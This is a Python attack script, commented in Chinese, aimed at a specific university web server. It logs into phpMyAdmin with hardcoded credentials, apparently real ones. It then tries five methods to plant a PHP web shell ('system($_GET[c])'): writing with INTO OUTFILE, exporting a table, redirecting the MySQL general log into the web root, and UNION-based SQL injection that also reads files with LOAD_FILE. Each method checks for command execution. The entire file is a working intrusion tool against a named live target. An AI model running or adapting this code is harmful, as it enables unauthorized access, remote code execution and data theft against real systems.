#!/usr/bin/env python3
import requests
import re
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th"
pma_url = url + "/phpmyadmin/"

# 登录phpMyAdmin
session = requests.Session()
session.verify = False
login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(pma_url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")

# 方法1: 通过phpMyAdmin的SQL执行，写入到已知存在的目录
print("[*] 方法1: 写入到enmeeting目录...")
sql = "SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/enmeeting/shell.php';"
sql_data = {"sql_query": sql, "db": "mysql"}
session.post(pma_url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

time.sleep(2)
test_shell = requests.get(f"{url}/enmeeting/shell.php?c=id", verify=False, timeout=5)
if "uid=" in test_shell.text:
    print(f"[+] Shell获取成功: {url}/enmeeting/shell.php?c=id")
    exit(0)

# 方法2: 通过phpMyAdmin的导出功能，导出到文件
print("[*] 方法2: phpMyAdmin导出到文件...")
# 创建包含shell的表
sql_create = "CREATE TABLE IF NOT EXISTS scmeeting.tmp(code TEXT);"
sql_data = {"sql_query": sql_create, "db": "scmeeting"}
session.post(pma_url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data, verify=False)

sql_insert = "INSERT INTO scmeeting.tmp VALUES('<?php system($_GET[\"c\"]); ?>');"
sql_data = {"sql_query": sql_insert, "db": "scmeeting"}
session.post(pma_url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data, verify=False)

# 尝试导出
export_params = {
    "token": token,
    "db": "scmeeting",
    "table": "tmp",
    "export_type": "sql",
    "what": "sql",
    "sql_query": "SELECT code FROM tmp;",
}

# 通过GET方式导出
export_url = pma_url + "db_export.php"
export_resp = session.get(export_url, params=export_params, verify=False, timeout=10)

# 方法3: 通过数据库日志，写入到web目录
print("[*] 方法3: 数据库日志写入...")
for log_path in ["/var/www/html/enmeeting/log.php", "/var/www/html/log.php"]:
    sql = f"SET GLOBAL general_log_file = '{log_path}';"
    session.post(pma_url + "server_sql.php", params={"token": token, "db": "mysql"}, data={"sql_query": sql}, verify=False)
    
    sql = "SET GLOBAL general_log = 'ON';"
    session.post(pma_url + "server_sql.php", params={"token": token, "db": "mysql"}, data={"sql_query": sql}, verify=False)
    
    sql = "SELECT '<?php system($_GET[\"c\"]); ?>';"
    session.post(pma_url + "server_sql.php", params={"token": token, "db": "mysql"}, data={"sql_query": sql}, verify=False)
    
    sql = "SET GLOBAL general_log = 'OFF';"
    session.post(pma_url + "server_sql.php", params={"token": token, "db": "mysql"}, data={"sql_query": sql}, verify=False)
    
    time.sleep(1)
    http_path = log_path.replace("/var/www/html", "")
    test_url = f"{url}{http_path}?c=id"
    test_resp = requests.get(test_url, verify=False, timeout=5)
    if "uid=" in test_resp.text:
        print(f"[+] Shell获取成功: {test_url}")
        exit(0)

# 方法4: 通过SQL注入读取x.php内容
print("[*] 方法4: SQL注入读取x.php...")
sqli_url = f"{url}/enmeeting/getmobilesubject.php"

# 从JSON结构看有40个字段，构造正确的UNION
nulls = ",".join(["NULL"] * 39)
payloads = [
    f"-1 UNION SELECT LOAD_FILE('/var/www/html/banpot/scmeeting/x.php'),{nulls}",
    f"-1 UNION SELECT LOAD_FILE('/home/banpot/scmeeting/x.php'),{nulls}",
    f"-1 UNION SELECT LOAD_FILE('/var/www/banpot/scmeeting/x.php'),{nulls}",
]

for payload in payloads:
    try:
        resp = requests.get(sqli_url, params={"subjectid": payload}, verify=False, timeout=10)
        if "<?php" in resp.text:
            print("[+] 读取x.php成功!")
            print("="*70)
            print(resp.text)
            print("="*70)
            exit(0)
        elif len(resp.text) > 200 and "FILE1LINK" not in resp.text:
            print(f"[*] 响应: {resp.text[:500]}")
    except Exception as e:
        pass

# 方法5: 尝试写入shell到enmeeting目录
print("[*] 方法5: SQL注入写入shell...")
write_payload = f"-1 UNION SELECT '<?php system($_GET[c]); ?>',{nulls} INTO OUTFILE '/var/www/html/enmeeting/shell.php'--"
resp = requests.get(sqli_url, params={"subjectid": write_payload}, verify=False, timeout=10)

time.sleep(2)
test_shell = requests.get(f"{url}/enmeeting/shell.php?c=id", verify=False, timeout=5)
if "uid=" in test_shell.text:
    print(f"[+] Shell获取成功: {url}/enmeeting/shell.php?c=id")
    exit(0)

print("[-] 所有方法尝试完毕")
